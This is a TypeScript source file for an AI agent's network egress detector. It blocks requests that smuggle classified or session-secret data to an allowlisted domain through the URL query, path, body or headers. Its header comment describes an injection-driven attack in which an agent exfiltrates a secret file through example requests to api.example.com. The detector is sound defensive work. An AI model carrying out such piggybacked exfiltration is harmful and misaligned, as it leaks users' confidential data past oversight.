import { NetworkRequest, EgressDecision } from "./network-types";
import { sessionSecretTracker } from "../classification";

/**
 * Evaluates network requests for piggybacking and data exfiltration attempts.
 *
 * Attack scenario:
 * 1. Agent has permission to access an authorized external API (e.g. https://api.example.com).
 * 2. Agent reads sensitive/secret data (e.g. demo/secret.txt, classification = SECRET).
 * 3. Under indirect prompt injection or rogue planning, the agent attempts:
 *      GET https://api.example.com/collect?data=SECRET
 *    or
 *      POST https://api.example.com/telemetry with body: SECRET
 * 4. Simple domain allowlisting would pass this request because api.example.com is allowed.
 * 5. This detector evaluates WHO, WHAT, WHERE, WHY, DATA (classification + provenance).
 */
export function detectPiggybacking(
  parsedUrl: URL,
  request: NetworkRequest
): EgressDecision {
  const { provenance, dataClassification, method, body } = request;

  // 1. Classification-based boundary check: SECRET data must NEVER cross external network boundaries
  if (dataClassification === "SECRET") {
    return {
      decision: "DENY",
      policy: "P-EXFIL-001",
      reason: "SECRET data cannot cross external network boundary",
      risk: "CRITICAL",
      details: {
        classification: dataClassification,
        trust: provenance.trust,
        sources: provenance.sources,
        destination: parsedUrl.origin,
      },
    };
  }

  // 2. Taint & Provenance + Classification check:
  // Data classified as CONFIDENTIAL or derived from UNTRUSTED/MIXED sources cannot be exfiltrated
  if (
    (provenance.trust === "UNTRUSTED" || provenance.trust === "MIXED") &&
    dataClassification === "CONFIDENTIAL"
  ) {
    return {
      decision: "DENY",
      policy: "P-EXFIL-001",
      reason: `Sensitive (${dataClassification}) data derived from ${provenance.trust} provenance cannot be transmitted externally`,
      risk: "CRITICAL",
      details: {
        classification: dataClassification,
        trust: provenance.trust,
        sources: provenance.sources,
      },
    };
  }

  // 3. Deep inspection of URL query parameters for secret tokens
  const fullSearch = parsedUrl.search;
  const searchLeak = sessionSecretTracker.containsAnySecret(fullSearch);
  if (searchLeak.leaked) {
    return {
      decision: "DENY",
      policy: "P-EXFIL-001",
      reason: `Network piggybacking detected: URL query parameters contain sensitive session data (${searchLeak.matchedSecretSnippet})`,
      risk: "CRITICAL",
      details: {
        destination: parsedUrl.hostname,
        query: fullSearch,
      },
    };
  }

  // Check URL pathname for embedded secret tokens (e.g. /api/SECRET_DATA)
  const pathLeak = sessionSecretTracker.containsAnySecret(parsedUrl.pathname);
  if (pathLeak.leaked) {
    return {
      decision: "DENY",
      policy: "P-EXFIL-001",
      reason: `Network piggybacking detected: URL path contains sensitive session data (${pathLeak.matchedSecretSnippet})`,
      risk: "CRITICAL",
      details: {
        destination: parsedUrl.hostname,
        path: parsedUrl.pathname,
      },
    };
  }

  // 4. Deep inspection of request body (POST / PUT / PATCH)
  if (body) {
    const bodyLeak = sessionSecretTracker.containsAnySecret(body);
    if (bodyLeak.leaked) {
      return {
        decision: "DENY",
        policy: "P-EXFIL-001",
        reason: `Network piggybacking detected: request body contains sensitive session data (${bodyLeak.matchedSecretSnippet})`,
        risk: "CRITICAL",
        details: {
          destination: parsedUrl.hostname,
          method,
        },
      };
    }
  }

  // 5. Header inspection
  if (request.headers) {
    for (const [headerName, headerValue] of Object.entries(request.headers)) {
      const headerLeak = sessionSecretTracker.containsAnySecret(headerValue);
      if (headerLeak.leaked) {
        return {
          decision: "DENY",
          policy: "P-EXFIL-001",
          reason: `Network piggybacking detected: header '${headerName}' contains sensitive session data`,
          risk: "CRITICAL",
        };
      }
    }
  }

  return {
    decision: "ALLOW",
    policy: "P-EXFIL-CLEAN",
    reason: "No network piggybacking or sensitive data exfiltration detected",
    risk: "LOW",
  };
}
